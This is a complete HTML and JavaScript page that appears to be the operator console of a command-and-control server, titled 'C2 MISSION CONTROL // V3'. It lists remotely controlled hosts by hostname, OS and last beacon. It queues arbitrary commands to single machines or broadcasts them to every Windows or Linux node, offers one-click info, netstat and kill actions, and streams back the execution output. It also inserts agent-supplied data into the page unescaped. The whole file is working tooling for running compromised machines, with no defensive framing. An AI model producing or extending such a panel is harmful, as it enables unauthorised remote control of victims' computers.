<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>C2 MISSION CONTROL // V3</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root { --accent: #00ff41; --bg: #0a0a0a; --card: #141414; --border: #252525; --text: #d0d0d0; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; padding: 2rem; }
        
        /* Grid Layout Fixes */
        .dashboard-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 1.5rem; margin-bottom: 1.5rem; }
        
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; position: relative; }
        .text-neon { color: var(--accent); text-shadow: 0 0 10px rgba(0, 255, 65, 0.3); font-weight: 800; text-transform: uppercase; }
        
        /* Header Fixes */
        .header-stats { display: flex; gap: 1rem; align-items: center; }
        .stat-badge { border: 1px solid var(--accent); padding: 0.4rem 1rem; font-size: 0.8rem; background: rgba(0, 255, 65, 0.05); }

        /* Table Aesthetics */
        .table { color: var(--text); border-color: var(--border); margin: 0; }
        .table thead th { border-bottom: 2px solid var(--border); font-size: 0.7rem; color: #666; }
        .table tbody td { border-bottom: 1px solid var(--border); padding: 12px 8px; vertical-align: middle; background: transparent !important; }
        
        /* Terminal / Feed */
        .terminal-box { background: #000; border: 1px solid var(--border); height: 400px; overflow-y: auto; padding: 1rem; font-family: 'Consolas', monospace; }
        pre { color: var(--accent); margin: 0; font-size: 0.85rem; line-height: 1.4; }
        
        /* Buttons */
        .btn-action { background: transparent; border: 1px solid #444; color: #888; font-size: 0.65rem; padding: 4px 10px; border-radius: 4px; transition: all 0.2s; }
        .btn-action:hover { border-color: var(--accent); color: var(--accent); background: rgba(0, 255, 65, 0.1); }
        .btn-kill:hover { border-color: #ff4444 !important; color: #ff4444 !important; }
        
        /* Targeting Glow */
        .target-selected { border-left: 3px solid var(--accent) !important; background: rgba(0, 255, 65, 0.02) !important; }
    </style>
</head>
<body>

    <div class="d-flex justify-content-between align-items-center mb-4">
        <h2 class="text-neon m-0">Strategic Command // Core</h2>
        <div class="header-stats">
            <div class="stat-badge">NODES: <span id="agent-count">0</span></div>
            <div class="stat-badge" id="clock">00:00:00</div>
        </div>
    </div>

    <div class="dashboard-grid">
        <div class="card">
            <h6 class="text-muted small mb-3">ASSET_INVENTORY</h6>
            <table class="table">
                <thead>
                    <tr><th>HOSTNAME</th><th>OS</th><th>LAST_BEACON</th><th>STATUS</th><th>ACTIONS</th></tr>
                </thead>
                <tbody id="agent-table"></tbody>
            </table>
        </div>

        <div class="card">
            <div class="d-flex justify-content-between mb-3">
                <h6 class="text-muted small">OPERATION_QUEUE</h6>
                <span onclick="purgeQueue()" style="cursor:pointer; color:#ff4444; font-size: 0.6rem;">[CLEAR_ALL]</span>
            </div>
            <div id="queue-list" class="terminal-box" style="height: 300px;"></div>
        </div>
    </div>

    <div class="card mb-4">
        <h6 class="text-muted small mb-3">COMMAND_UPLINK</h6>
        <form id="cmd-form">
            <div class="row g-2">
                <div class="col-md-3">
                    <select name="target" id="target-select" class="form-select bg-dark text-white border-secondary">
                        <option value="ALL">BROADCAST_ALL</option>
                        <optgroup label="OS_GROUPS">
                            <option value="BROADCAST_WINDOWS">WINDOWS_ALL</option>
                            <option value="BROADCAST_LINUX">LINUX_ALL</option>
                        </optgroup>
                        <optgroup label="ASSETS" id="opt-assets"></optgroup>
                    </select>
                </div>
                <div class="col-md-7">
                    <input type="text" name="command" id="cmd-input" class="form-control bg-dark text-white border-secondary" placeholder="Awaiting manual instructions..." required>
                </div>
                <div class="col-md-2">
                    <button class="btn btn-outline-success w-100">TRANSMIT</button>
                </div>
            </div>
        </form>
    </div>

    <div class="card">
        <h6 class="text-muted small mb-3">EXECUTION_LOGS</h6>
        <div id="results-feed" class="terminal-box" style="height: 450px;"></div>
    </div>

    <script>
        let seenResultIds = new Set();

        async function triggerAction(hostname, action) {
            const formData = new FormData();
            formData.append('hostname', hostname);
            formData.append('action', action);
            await fetch('/admin/action', { method: 'POST', body: formData });
            updateDashboard();
        }

        function selectAgent(hostname) {
            document.getElementById('target-select').value = hostname;
            document.getElementById('cmd-input').focus();
            updateDashboard(); // Refresh to show highlight
        }

        async function updateDashboard() {
            try {
                const response = await fetch('/api/stats');
                const data = await response.json();
                const table = document.getElementById('agent-table');
                const optAssets = document.getElementById('opt-assets');
                const currentTarget = document.getElementById('target-select').value;

                document.getElementById('agent-count').innerText = data.total_count;
                table.innerHTML = ''; optAssets.innerHTML = '';

                data.agents.forEach(agent => {
                    const isWin = agent.os.toLowerCase().includes("windows");
                    const isSelected = currentTarget === agent.hostname;
                    
                    table.innerHTML += `
                        <tr class="${isSelected ? 'target-selected' : ''}">
                            <td onclick="selectAgent('${agent.hostname}')" style="cursor:pointer"><strong>${agent.hostname}</strong></td>
                            <td><small class="text-muted">${agent.os}</small></td>
                            <td><small>${agent.last_seen}</small></td>
                            <td style="color: ${agent.status === 'ONLINE' ? '#00ff41' : '#ff4444'}">● ${agent.status}</td>
                            <td>
                                <button class="btn-action" onclick="triggerAction('${agent.hostname}', 'sysinfo')">INFO</button>
                                <button class="btn-action" onclick="triggerAction('${agent.hostname}', 'netstat')">NET</button>
                                <button class="btn-action btn-kill" onclick="triggerAction('${agent.hostname}', 'kill')">KILL</button>
                            </td>
                        </tr>`;
                    optAssets.innerHTML += `<option value="${agent.hostname}">${agent.hostname}</option>`;
                });

                // Render Queue and Results Feed (logic remains same but cleaner markup)
                const qList = document.getElementById('queue-list');
                qList.innerHTML = data.queue.length === 0 ? '<div class="text-center mt-5 opacity-25 small">IDLE</div>' : '';
                data.queue.forEach(t => {
                    qList.innerHTML += `<div class="mb-2 small"><span class="text-warning">></span> ${t.target}: <span class="text-white">${t.command}</span></div>`;
                });

                const resFeed = document.getElementById('results-feed');
                data.results.forEach(res => {
                    if (!seenResultIds.has(res.id)) {
                        seenResultIds.add(res.id);
                        const div = document.createElement('div');
                        div.className = "mb-4 pb-2 border-bottom border-dark";
                        div.innerHTML = `<small class="text-muted">[${res.timestamp}] ${res.hostname}</small><pre>${res.output}</pre>`;
                        resFeed.prepend(div);
                    }
                });
            } catch (e) { console.error("Poll fail", e); }
        }

        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
        document.getElementById('cmd-form').onsubmit = async (e) => {
            e.preventDefault();
            await fetch('/admin/send_cmd', { method: 'POST', body: new FormData(e.target) });
            e.target.reset();
            updateDashboard();
        };
        setInterval(updateDashboard, 3000);
        updateDashboard();
    </script>
</body>
</html>
